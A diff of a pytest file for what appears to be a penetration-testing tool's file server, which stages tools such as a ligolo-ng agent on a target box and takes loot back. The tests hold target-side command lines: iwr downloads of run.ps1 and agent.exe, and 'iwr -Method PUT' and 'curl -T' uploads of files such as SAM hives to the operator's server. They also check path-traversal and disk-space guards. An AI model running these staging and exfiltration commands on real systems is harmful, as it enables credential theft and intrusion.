@@ -276,7 +276,7 @@ def test_serve_starts_on_the_tunnel_and_says_how_many_files_without_listing_them
     assert lines(session, "ok") == [f"serving dc01's upload folder and the tools' files on http://127.0.0.1:{port}/{SECRET}/"]
     assert lines(session, "detail") == []
     assert lines(session, "info") == [
-        "2 files; serve files shows the download lines",
+        "2 files; serve files shows the lines to fetch them and to send files back",
         "serve log shows who fetched what; serve stop ends it",
     ]
 
@@ -294,6 +294,8 @@ def test_serve_files_shows_the_download_lines(session, tunnel):
     assert session.console.lines == [
         ("detail", f"iwr http://127.0.0.1:{port}/{SECRET}/run.ps1 -OutFile run.ps1"),
         ("detail", f"iwr http://127.0.0.1:{port}/{SECRET}/ligolo-ng/agent.exe -OutFile agent.exe"),
+        ("info", "to send a file back into targets/dc01/loot:"),
+        ("detail", f"iwr -Method PUT -InFile <file> http://127.0.0.1:{port}/{SECRET}/<file>"),
     ]
 
 
@@ -482,3 +484,101 @@ def test_the_real_server_outlives_the_prompt_that_started_it(session, served, mo
     finally:
         serving.stop(session.paths)
     time.sleep(0.1)
+
+
+# ---- receiving
+
+
+@pytest.mark.parametrize("name", ["loot.zip", "SAM backup.hive", "x.tar.gz"])
+def test_received_name_takes_one_plain_name_under_the_secret(name):
+    assert serving.received_name(f"/{SECRET}/{name.replace(' ', '%20')}", SECRET) == name
+
+
+@pytest.mark.parametrize(
+    "path",
+    [f"/{SECRET}/", f"/{SECRET}", "/loot.zip", f"/wrong/loot.zip", f"/{SECRET}/a/b.zip", f"/{SECRET}/.bashrc",
+     f"/{SECRET}/..", f"/{SECRET}/%2e%2e", f"/{SECRET}/a%5cb", f"/{SECRET}/a%0ab", f"/{SECRET}/a%00b",
+     f"/{SECRET}/" + "x" * 201],
+)
+def test_received_name_refuses_anything_else(path):
+    assert serving.received_name(path, SECRET) is None
+
+
+def test_receive_into_writes_the_file_and_never_over_another(tmp_path):
+    import io
+
+    loot = tmp_path / "loot"
+    first = serving.receive_into(loot, "sam.hive", 5, io.BytesIO(b"first and more"))
+    second = serving.receive_into(loot, "sam.hive", 6, io.BytesIO(b"second"))
+    assert (first.name, first.read_bytes()) == ("sam.hive", b"first")
+    assert (second.name, second.read_bytes()) == ("sam-2.hive", b"second")
+    assert sorted(p.name for p in loot.iterdir()) == ["sam-2.hive", "sam.hive"]
+
+
+def test_a_transfer_cut_short_leaves_nothing(tmp_path):
+    import io
+
+    loot = tmp_path / "loot"
+    with pytest.raises(OSError, match="cut short"):
+        serving.receive_into(loot, "big.bin", 100, io.BytesIO(b"only this"))
+    assert list(loot.iterdir()) == []
+
+
+def test_receive_refuses_what_would_fill_the_disk(tmp_path, monkeypatch):
+    import io
+    from collections import namedtuple
+
+    usage = namedtuple("usage", "total used free")
+    monkeypatch.setattr(serving.shutil, "disk_usage", lambda path: usage(0, 0, serving.ROOM_LEFT + 10))
+    with pytest.raises(serving.NoRoom):
+        serving.receive_into(tmp_path / "loot", "x.bin", 11, io.BytesIO(b"x" * 11))
+    assert serving.receive_into(tmp_path / "loot", "x.bin", 10, io.BytesIO(b"x" * 10)).read_bytes() == b"x" * 10
+
+
+@pytest.mark.parametrize(
+    ("os_name", "expected"),
+    [
+        ("windows", ["iwr -Method PUT -InFile <file> http://a/s/<file>"]),
+        ("linux", ["curl -T <file> http://a/s/"]),
+        ("", ["curl -T <file> http://a/s/", "iwr -Method PUT -InFile <file> http://a/s/<file>"]),
+    ],
+)
+def test_upload_lines_follow_the_box_s_os(os_name, expected):
+    assert serving.upload_lines(os_name, "http://a/s/") == expected
+
+
+def put(address, port, path, data, headers=None):
+    request = urllib.request.Request(f"http://{address}:{port}{path}", data=data, method="PUT", headers=headers or {})
+    try:
+        with urllib.request.urlopen(request, timeout=5) as answer:
+            return answer.status, answer.read()
+    except urllib.error.HTTPError as exc:
+        with exc:
+            return exc.code, exc.read()
+
+
+@posix_only
+def test_the_real_server_takes_files_back_into_loot(session, served, monkeypatch):
+    folder, tools = served
+    monkeypatch.setattr(serving, "target_folder", lambda box, target: folder)
+    port = free_port()
+    marker = serving.start(session.paths, session.box, session.current, "127.0.0.1", port, clock=lambda: NOW)
+    s = f"/{marker.secret}"
+    loot = folder.parent / "loot"
+    try:
+        assert put("127.0.0.1", port, f"{s}/sam.hive", b"hive") == (201, b"saved sam.hive\n")
+        assert put("127.0.0.1", port, f"{s}/sam.hive", b"again") == (201, b"saved sam-2.hive\n")
+        assert (loot / "sam.hive").read_bytes() == b"hive" and (loot / "sam-2.hive").read_bytes() == b"again"
+        # without the secret, into a folder, or as a dot name, nothing is taken
+        assert put("127.0.0.1", port, "/sam.hive", b"x")[0] == 404
+        assert put("127.0.0.1", port, f"{s}/sub/x.txt", b"x")[0] == 404
+        assert put("127.0.0.1", port, f"{s}/.profile", b"x")[0] == 404
+        assert put("127.0.0.1", port, f"{s}/..%2fbox.toml", b"x")[0] == 404
+        assert sorted(p.name for p in loot.iterdir()) == ["sam-2.hive", "sam.hive"]
+        # what was taken in is not served back: loot is not one of the folders offered
+        assert fetch("127.0.0.1", port, f"{s}/sam.hive")[0] == 404
+    finally:
+        serving.stop(session.paths)
+    log = serving.log_tail(session.paths, 50)
+    assert any(f"PUT {s}/sam.hive HTTP/1.1  201  saved loot/sam.hive" in line for line in log)
+    assert any(f"PUT {s}/sam.hive HTTP/1.1  201  saved loot/sam-2.hive" in line for line in log)
